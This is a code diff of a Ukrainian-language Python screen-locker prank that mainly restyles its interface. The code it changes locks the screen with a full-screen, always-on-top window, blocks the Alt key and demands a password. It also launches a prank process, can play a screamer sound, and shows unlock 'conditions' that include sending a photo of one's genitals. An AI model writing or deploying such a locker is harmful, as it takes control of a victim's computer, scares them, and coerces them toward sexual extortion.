@@ -18,9 +18,22 @@ BACKUP_PASSWORD = "unlockmepls"
 # Аудіо для скрімера (MP3 буде відкриватися в системному плеєрі)
 SCREAMER_PATH = os.path.join("assets", "audio.mp3")
 
-# Теми
+# Теми та кольори
 ctk.set_appearance_mode("dark")
-ctk.set_default_color_theme("dark-blue")
+ctk.set_default_color_theme("blue")
+
+# Кольорова палітра
+COLORS = {
+    "bg_primary": "#0d1117",
+    "bg_secondary": "#161b22", 
+    "bg_tertiary": "#21262d",
+    "accent": "#238636",
+    "accent_hover": "#2ea043",
+    "text_primary": "#f0f6fc",
+    "text_secondary": "#8b949e",
+    "error": "#f85149",
+    "warning": "#d29922"
+}
 
 # Блокуємо комбінації клавіш
 keyboard.block_key("alt")
@@ -64,41 +77,94 @@ def start_goose():
     if os.path.exists(goose_path):
         subprocess.Popen(goose_path)  # Запускаємо гуся в окремому процесі
 
-# Вікно
+# Вікно з градієнтним фоном
 root = ctk.CTk()
 screen_width = root.winfo_screenwidth()
 screen_height = root.winfo_screenheight()
 root.geometry(f"{screen_width}x{screen_height}+0+0")
-root.configure(bg="#202020")
+root.configure(fg_color=COLORS["bg_primary"])
 root.attributes("-topmost", True)
 root.overrideredirect(True)
 
-# Основний контейнер
-main_frame = ctk.CTkFrame(master=root, fg_color="#202020")
+# Основний контейнер з тінню
+main_frame = ctk.CTkFrame(
+    master=root, 
+    fg_color=COLORS["bg_primary"],
+    corner_radius=0
+)
 main_frame.pack(fill="both", expand=True)
 
-# Центр
-content_frame = ctk.CTkFrame(master=main_frame, fg_color="#202020")
+# Центральна панель з заокругленими кутами та тінню
+content_frame = ctk.CTkFrame(
+    master=main_frame, 
+    fg_color=COLORS["bg_secondary"],
+    corner_radius=20,
+    border_width=2,
+    border_color=COLORS["bg_tertiary"]
+)
 content_frame.place(relx=0.5, rely=0.5, anchor="center")
 
+# Іконка блокування
+lock_icon = ctk.CTkLabel(
+    content_frame, 
+    text="🔒", 
+    font=ctk.CTkFont(size=60),
+    text_color=COLORS["warning"]
+)
+lock_icon.pack(pady=(40, 20))
+
 # Заголовок
-label = ctk.CTkLabel(content_frame, text="Цей комп’ютер заблоковано", font=ctk.CTkFont(size=40, weight="bold"), text_color="white")
-label.pack(pady=(50, 10))
+label = ctk.CTkLabel(
+    content_frame, 
+    text="СИСТЕМА ЗАБЛОКОВАНА", 
+    font=ctk.CTkFont(size=42, weight="bold"), 
+    text_color=COLORS["text_primary"]
+)
+label.pack(pady=(0, 10))
 
-subtitle = ctk.CTkLabel(content_frame, text="Введіть пароль для розблокування", font=ctk.CTkFont(size=26), text_color="white")
-subtitle.pack(pady=(0, 20))
+# Підзаголовок
+subtitle = ctk.CTkLabel(
+    content_frame, 
+    text="Введіть пароль для розблокування доступу", 
+    font=ctk.CTkFont(size=22), 
+    text_color=COLORS["text_secondary"]
+)
+subtitle.pack(pady=(0, 30))
 
-# Поле для пароля
-entry = ctk.CTkEntry(content_frame, placeholder_text="Пароль", show="*", font=ctk.CTkFont(size=26), width=360)
-entry.pack(pady=10)
+# Поле для пароля з сучасним дизайном
+entry = ctk.CTkEntry(
+    content_frame, 
+    placeholder_text="Введіть пароль...", 
+    show="*", 
+    font=ctk.CTkFont(size=24), 
+    width=400,
+    height=50,
+    corner_radius=15,
+    border_width=2,
+    border_color=COLORS["bg_tertiary"],
+    fg_color=COLORS["bg_tertiary"],
+    text_color=COLORS["text_primary"],
+    placeholder_text_color=COLORS["text_secondary"]
+)
+entry.pack(pady=15)
 
-# Повідомлення
-error_label = ctk.CTkLabel(content_frame, text="", text_color="red", font=ctk.CTkFont(size=20))
-error_label.pack()
+# Повідомлення про помилки
+error_label = ctk.CTkLabel(
+    content_frame, 
+    text="", 
+    text_color=COLORS["error"], 
+    font=ctk.CTkFont(size=18, weight="bold")
+)
+error_label.pack(pady=(10, 0))
 
 # Історія спроб
-attempts_label = ctk.CTkLabel(content_frame, text="", text_color="gray", font=ctk.CTkFont(size=18))
-attempts_label.pack(pady=(10, 0))
+attempts_label = ctk.CTkLabel(
+    content_frame, 
+    text="", 
+    text_color=COLORS["text_secondary"], 
+    font=ctk.CTkFont(size=16)
+)
+attempts_label.pack(pady=(5, 20))
 
 # Умови (лише текст)
 conditions = (
@@ -112,28 +178,51 @@ conditions = (
     "P.s фотка пісюна в лс тоже підійде."
 )
 
-conditions_label = ctk.CTkLabel(content_frame, text=conditions, wraplength=800, font=ctk.CTkFont(size=18), text_color="white", justify="left")
-conditions_label.pack(pady=20)
+conditions_label = ctk.CTkLabel(
+    content_frame, 
+    text=conditions, 
+    wraplength=800, 
+    font=ctk.CTkFont(size=16), 
+    text_color=COLORS["text_secondary"], 
+    justify="left"
+)
+conditions_label.pack(pady=(20, 15))
 
-# Загадка-фейк
-riddle_text = "Загадка: Не корабель, а з вітрилом — не труба, а з голосилом. Хто я?"
-riddle = ctk.CTkLabel(content_frame, text=riddle_text, font=ctk.CTkFont(size=20), text_color="white")
-riddle.pack(pady=(10, 5))
+# Загадка-фейк з кращим стилем
+riddle_text = "💡 Загадка: Не корабель, а з вітрилом — не труба, а з голосилом. Хто я?"
+riddle = ctk.CTkLabel(
+    content_frame, 
+    text=riddle_text, 
+    font=ctk.CTkFont(size=18, weight="bold"), 
+    text_color=COLORS["warning"]
+)
+riddle.pack(pady=(15, 30))
 
 # Скрімер запуск (відкриття MP3 через системний плеєр)
 def play_screamer():
     if os.path.exists(SCREAMER_PATH):
         os.startfile(SCREAMER_PATH)
 
-# Тремтіння вікна
-def shake_window():
-    for _ in range(10):
-        x = random.randint(-10, 10)
-        y = random.randint(-10, 10)
-        root.geometry(f"{screen_width}x{screen_height}+{x}+{y}")
+# Анімація помилки (замість тряски)
+def show_error_animation():
+    # Плавна анімація зміни кольору для показу помилки
+    original_color = error_label.cget("text_color")
+    
+    # Анімація моргання
+    for i in range(4):
+        error_label.configure(text_color=COLORS["error"])
+        entry.configure(border_color=COLORS["error"])
         root.update()
-        time.sleep(0.02)
-    root.geometry(f"{screen_width}x{screen_height}+0+0")
+        time.sleep(0.15)
+        error_label.configure(text_color="#ff8888")
+        entry.configure(border_color="#ff8888")
+        root.update()
+        time.sleep(0.15)
+    
+    # Повертаємо оригінальні кольори
+    error_label.configure(text_color=original_color)
+    entry.configure(border_color=COLORS["bg_tertiary"])
+    entry.delete(0, 'end')  # Очищаємо поле вводу
 
 # Розблокування
 def unlock():
@@ -149,11 +238,30 @@ def unlock():
         root.destroy()
     else:
         error_label.configure(text="Невірний пароль!")
-        shake_window()
+        show_error_animation()
 
-# Кнопка розблокування
-btn = ctk.CTkButton(content_frame, text="Розблокувати", command=unlock, font=ctk.CTkFont(size=26), width=240, height=60, corner_radius=10)
-btn.pack(pady=25)
+# Кнопка розблокування з сучасним дизайном
+btn = ctk.CTkButton(
+    content_frame, 
+    text="🔓 РОЗБЛОКУВАТИ", 
+    command=unlock, 
+    font=ctk.CTkFont(size=24, weight="bold"), 
+    width=300, 
+    height=60, 
+    corner_radius=15,
+    fg_color=COLORS["accent"],
+    hover_color=COLORS["accent_hover"],
+    text_color=COLORS["text_primary"],
+    border_width=0
+)
+btn.pack(pady=30)
+
+# Прив'язка клавіші Enter до кнопки розблокування
+def on_enter(event):
+    unlock()
+
+entry.bind('<Return>', on_enter)
+entry.focus()  # Автофокус на поле вводу
 
 # Запускаємо гуся
 start_goose()
